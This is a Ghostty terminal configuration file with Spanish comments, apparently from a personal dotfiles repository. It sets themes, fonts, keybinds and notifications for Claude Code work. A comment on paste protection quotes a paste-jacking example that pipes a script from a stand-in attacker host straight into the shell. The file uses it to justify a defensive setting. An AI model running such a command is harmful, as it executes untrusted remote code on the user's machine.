# ═══════════════════════════════════════════════════════════════
#  Ghostty — Claude Code edition
#  Tema activo: ver línea `theme =` abajo. Sólo built-ins de
#  Ghostty (lista: `ghostty +list-themes`). Tipografía: PlemolJP
#  Console NF.
#
#  NOTA: Ghostty NO permite comentarios inline en la misma línea
#  que un valor. Siempre van en una línea propia.
# ═══════════════════════════════════════════════════════════════

# ─── tema ─────────────────────────────────────────────────────
# Built-in de Ghostty (469 disponibles, lista con `ghostty +list-themes`
# o preview en https://ghosttythemes.com).
# Warm picks: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
# Dark Hard, Kanagawa Wave (dark) — Gruvbox Material Light, Rose Pine
# Dawn, Catppuccin Latte, Kanagawa Lotus (light).
# Solarized picks: Solarized Dark Patched (estilo craftzdog),
# carbon — minimal true-black, high contrast (matchea con carbon.lua/.conf).
#
# NOTA: este `theme =` es el DEFAULT versionado del stack. La selección
# activa la maneja `scripts/theme <id>`, que escribe themes/current.local
# (incluido al final de este archivo, gana por last-wins). Una máquina
# recién clonada sin current.local cae a este default.
theme = carbon

# Custom themes — viven en `ghostty/themes/` (symlinkeado a
# <config-dir>/themes/ por install.sh).
#   · oled-neon — true black (#000) + paleta neon Dracula-style.
#     Pensado para OLED y sesiones nocturnas; máximo contraste.
#   · anthropic-warm — carbón cálido + paleta Claude (terracota, oliva,
#     ámbar, naranja). Pensado para display-p3 + transparencia, sesiones
#     largas sin fatiga.
#   · prism-night — azul-noche profundo (#0a0e1a) con acentos del
#     espectro (naranja → amarillo → verde → cyan → azul → violeta).
#     Sampleado del wallpaper "prism" de macOS.
# Si volvés a Solarized Dark Patched, descomentá para recuperar el
# "deep ocean" azul casi negro estilo craftzdog.
# background = #031219

# Display P3 wide-gamut — naranja y crema saturan más en pantallas
# M-chip / Retina. Sin downside fuera de equipos no-P3.
window-colorspace = display-p3

# Contraste mínimo automático. Tradeoff fino:
#   1.1 = sin enforcement (default amable). Dim grays se evaporan
#         en light themes, brand colors fieles.
#   3.0 = WCAG AA large-text. Rescata los peores grays pero preserva
#         brand colors como Claude orange (#d97757, ratio 3.28:1 sobre
#         cream — pasa intacto). Sweet spot para light themes.
#   4.5 = WCAG AA body text. Rescata todo gray pero DISTORSIONA brand
#         colors: Claude orange queda casi negro. No recomendado.
# Si volvés a dark theme con grays muted intencionales (Poimandres
# Storm, Kanso Zen), bajá a 1.1 para fidelidad total al theme.
minimum-contrast = 1.1

# ─── tipografía ───────────────────────────────────────────────
# PlemolJP Console NF — fuente bilingüe JP/EN del estilo craftzdog.
# Base IBM Plex Mono + glyphs japoneses + Nerd Font integrado (íconos
# de starship/devicons sin fallback). "Console" = ratio 5:6 (más compacto
# que el ratio 1:2 de PlemolJP estándar), ideal para terminales densos.
font-family             = PlemolJP Console NF
font-size = 15

# Ligaduras estándar — iA Writer no es texture-healing pero soporta
# +liga para los operadores comunes (=>, !=, >=, etc.).
font-feature = +liga

font-thicken = true

# Interlineado compacto — un toque sobre el default para que las
# tildes/descenders no se peguen, sin desperdiciar verticales.
# Subir a 10-15% si querés más aire, bajar a 0% para nativo de Iosevka.
adjust-cell-height = 3%

# ─── ventana ──────────────────────────────────────────────────
# tabs integradas en el titlebar (estilo Chrome/Arc): libera ~1
# línea vertical de terminal y queda más limpio que tener tab bar
# y titlebar separadas. El color hereda del background del theme.
# Alternativas: transparent (titlebar funde con fondo, tab bar
# aparte) · native (look macOS estándar) · hidden (sin titlebar).
macos-titlebar-style = tabs

# Fondo 100% opaco, sin blur — fondo sólido para máxima legibilidad.
# Con cualquier transparencia (<1.0) el wallpaper se cuela detrás del texto
# y el ojo intenta enfocar dos planos a la vez → fatiga al leer output denso.
# Si en el futuro querés el look glass craftzdog: opacity 0.88-0.95 + blur 20-40.
background-opacity = 1.0
background-blur = 0

# respira lateralmente — padding generoso para que el output denso
# de Claude Code (tool calls, diffs, árboles) no se sienta apretado.
window-padding-x = 22
window-padding-y = 18

# centra contenido al hacer reflow
window-padding-balance = true

# extend = el padding hereda el color de la celda adyacente al borde
# (se ve más cohesivo al seleccionar texto cerca del margen).
window-padding-color = extend

# restaura sesión al reabrir Ghostty
window-save-state = always

# ─── cursor ───────────────────────────────────────────────────
# Block — look "terminal classic" con carácter. El color sale del
# theme activo (cursor-color + cursor-text). Otras opciones: bar,
# block_hollow, underline.
cursor-style = block

# sin parpadeo — cursor fijo, más sobrio y menos distractor. El
# bloque sólido naranja ya es suficientemente visible sin animar.
cursor-style-blink = false

# ─── selección y copiado ──────────────────────────────────────
# seleccionar ya copia (workflow rápido)
copy-on-select = clipboard

# Trim de espacios/newlines al final al copiar — evita el clásico
# "pegué un comando y se ejecutó solo porque había \n al final".
clipboard-trim-trailing-spaces = true

# Paste protection — Ghostty te muestra confirm dialog si el texto
# pegado contiene newlines o caracteres de control sospechosos
# (typical attack: copiar "ls" de una web que en realidad es
# "ls; curl evil.sh | sh\n"). Cost: un click extra ocasional.
clipboard-paste-protection = true

# ─── scrollback ───────────────────────────────────────────────
# buffer grande para releer outputs largos
scrollback-limit = 100000

# ─── notificaciones ───────────────────────────────────────────
# Silenciar campanas — en SDD las interrupciones rompen el flow.
# bell-features controla todos los modos de la campana.
bell-features = no-system,no-audio,no-attention,no-title,no-border

# ─── mouse ────────────────────────────────────────────────────
mouse-hide-while-typing = true

# ─── quick terminal (drop-down estilo Quake) ──────────────────
# ⌥` te abre un terminal flotante encima de cualquier app para
# checar algo sin perder el contexto de tu ventana principal.
# Se cierra con la misma combinación pero el proceso sigue vivo
# en background — ideal para tener tmux sessions persistentes
# (claude, lazygit, REPLs) que reabrís al instante.
quick-terminal-position = top
# 100% = ocupa toda la pantalla (full-screen popup). Si en algún
# momento querés volver al modo "drop-down chico" estilo Quake,
# poné 40% o 50%.
quick-terminal-size = 100%
quick-terminal-animation-duration = 0.15
keybind = global:alt+grave_accent=toggle_quick_terminal

# ─── splits ───────────────────────────────────────────────────
# ⌘D abre split derecho y ⌘⇧D abre split abajo (defaults de Ghostty).
# Navegación vim-style entre splits — clave cuando tienes
# [spec | implementación | tests] lado a lado.
keybind = cmd+alt+h=goto_split:left
keybind = cmd+alt+j=goto_split:bottom
keybind = cmd+alt+k=goto_split:top
keybind = cmd+alt+l=goto_split:right
keybind = cmd+shift+enter=toggle_split_zoom
keybind = cmd+alt+equal=equalize_splits

# Reset font-size — útil al hacer demos o screen-share de specs
keybind = cmd+zero=reset_font_size

# Shift+Enter = newline en Claude Code (en vez de submit). Ghostty
# por default sigue modifyOtherKeys y manda `\x1b[27;2;13~`, que
# Claude Code no interpreta como newline. Mandar `\n` directo sí
# funciona — TUIs estilo nvim/lazygit no ven Shift+Enter sin esto
# pero tampoco lo necesitan. Workaround documentado en ghostty
# discussion #7780 y claude-code issue #5757.
keybind = shift+enter=text:\n

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 1 — macOS essentials
# ═══════════════════════════════════════════════════════════════

# Option (⌥) funciona como Alt → keybinds de vim/zsh/emacs funcionan.
# `left`: solo el Option IZQUIERDO se mapea como Alt. El Option DERECHO
# queda libre para caracteres especiales con teclado ES (⌥+ñ, ⌥+5 = €,
# ⌥+8 = •, ⌥+e = ´, etc.). Mejor que `true` (ambos) si tipeás especiales.
macos-option-as-alt = left

# Shell integration: activa cursor de stand-by con sudo,
# inyecta path para apertura de archivos por click, etc.
shell-integration-features = cursor,sudo,title,no-ssh-env,no-ssh-terminfo,path

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 2 — Notificaciones de comandos largos
# ═══════════════════════════════════════════════════════════════

# Notifica vía macOS cuando un comando termina Y la ventana
# está en otra app (no te molesta si ya estás viendo el terminal).
notify-on-command-finish = unfocused

# Solo notifica si tardó más de 10 segundos.
notify-on-command-finish-after = 10s

# Notificación nativa de macOS, sin sonido de bell.
notify-on-command-finish-action = no-bell,notify

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 3 — Polish visual
# ═══════════════════════════════════════════════════════════════

# Splits sin foco se atenúan al 85% — ves al instante dónde tecleas.
unfocused-split-opacity = 0.85

# Muestra dimensiones (cols×rows) al redimensionar la ventana.
resize-overlay = always
resize-overlay-position = center

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 4 — Keybinds productivos
# ═══════════════════════════════════════════════════════════════

# Limpia la pantalla (preserva scrollback).
keybind = cmd+k=clear_screen

# Abre el archivo de config con tu editor por default.
keybind = cmd+comma=open_config

# Recarga config sin reiniciar Ghostty.
keybind = cmd+shift+r=reload_config

# Copia la URL seleccionada en el buffer al clipboard.
keybind = cmd+shift+u=copy_url_to_clipboard

# Cambia el título de la pestaña actual (útil para organizar SDD).
keybind = cmd+shift+i=prompt_surface_title

# Jump-to-prompt (requiere shell-integration, ya activo arriba).
# Salta al prompt anterior/siguiente en el scrollback — clave para
# releer outputs largos de Claude Code sin scrollear a mano.
keybind = cmd+up=jump_to_prompt:-1
keybind = cmd+down=jump_to_prompt:1

# Tabs por número: ⌘1..⌘9 salta directo a esa tab.
keybind = cmd+one=goto_tab:1
keybind = cmd+two=goto_tab:2
keybind = cmd+three=goto_tab:3
keybind = cmd+four=goto_tab:4
keybind = cmd+five=goto_tab:5
keybind = cmd+six=goto_tab:6
keybind = cmd+seven=goto_tab:7
keybind = cmd+eight=goto_tab:8
keybind = cmd+nine=goto_tab:9

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 5 — Dock icon coordinado con Vesper
# ═══════════════════════════════════════════════════════════════

# custom-style: frame aluminum (mac-nativo) + pantalla deep-ocean
# osaka (#031219 → #073642) + fantasma naranja Claude. Variantes
# built-in (mutuamente excluyentes con custom-style — NO aceptan
# overrides de color): official, blueprint, chalkboard, microchip,
# glass, holographic, paper, retro, xray.
macos-icon = custom-style

# Frame: aluminum (gris hardware mac). Alternativas:
# beige (paper-ish cálido), plastic (off-white), chrome (sleek).
macos-icon-frame = aluminum

# Fantasma blanco — neutral, brand-agnostic, máximo contraste sobre la
# screen prism (donde el verde láser se mimetizaba con la banda ROYGBIV).
# Variantes: #d97757 Claude orange · #50fa7b verde láser (matchea cursor
# oled-neon) · #ff79c6 magenta neon (standout sin mimetizarse).
macos-icon-ghost-color = #ffffff

# Pantalla: gradiente "prism" inspirado en el wallpaper macOS Prism —
# deep midnight blue (#0a0e1a) dominante con una banda ROYGBIV cruzando
# la parte superior-media. Ghostty sólo soporta gradientes LINEALES
# VERTICALES (primer color = abajo, último = arriba, hasta 64 stops),
# así que el diagonal real del wallpaper no se replica — la banda queda
# horizontal en el icono.
#
# Decoupled del `background` del terminal: este icono se queda prism
# aunque cambies de theme. Si querés que vuelva a seguir al bg, reemplazar
# con `macos-icon-screen-color = <bg>,<bg-lift>`.
#
# Estructura (bottom → top):
#   1-5  hold deep midnight (zona "foreground" del wallpaper, abajo)
#   6    lift sutil hacia la banda
#   7-12 ROYGBIV (cool blue → cyan → green → yellow → orange → red)
#   13   post-rainbow violet glow
#   14   deep midnight de vuelta (zona "sky", arriba)
macos-icon-screen-color = #0a0e1a,#0a0e1a,#0a0e1a,#0a0e1a,#0d1428,#1a2238,#4a7ec8,#8be9fd,#50fa7b,#f1fa8c,#ff8c42,#c8553d,#2a1828,#0a0e1a

# ═══════════════════════════════════════════════════════════════
#  PAQUETE 6 — Fullscreen pro (macOS)
# ═══════════════════════════════════════════════════════════════

# Fullscreen non-native: sin la transición animada de macOS
# (no manda Ghostty a otro "space"), mantiene la menubar visible.
# Mucho mejor para focus mode rápido con ⌘↩.
# Otras opciones: false (native), true (non-native sin menubar).
macos-non-native-fullscreen = visible-menu

# Si prefieres ocultar los semáforos (rojo/amarillo/verde) cuando
# entres a fullscreen para una vista más limpia, descomenta:
# macos-window-buttons = hidden

# ═══════════════════════════════════════════════════════════════
#  Tema del stack — override per-máquina (override-at-end)
# ═══════════════════════════════════════════════════════════════

# `scripts/theme <id>` escribe current.local con un único `theme = <id>`.
# Va AL FINAL del config → el último `theme=` gana sobre el default de
# arriba (same-key last-wins de Ghostty). El `?` hace el include OPCIONAL:
# si no existe (máquina recién clonada, o nunca corriste `theme`), Ghostty
# lo ignora sin error y usás el default. Mismo patrón que ~/.zshrc.local.
#
# Path ABSOLUTO a propósito: los relativos de config-file resuelven
# contra el dir del config (Application Support), pero los themes viven
# en ~/.config/ghostty/themes/ (symlink al repo). current.local va ahí
# para quedar gitignored (*.local) — selección per-máquina dentro del repo.
config-file = ?~/.config/ghostty/themes/current.local

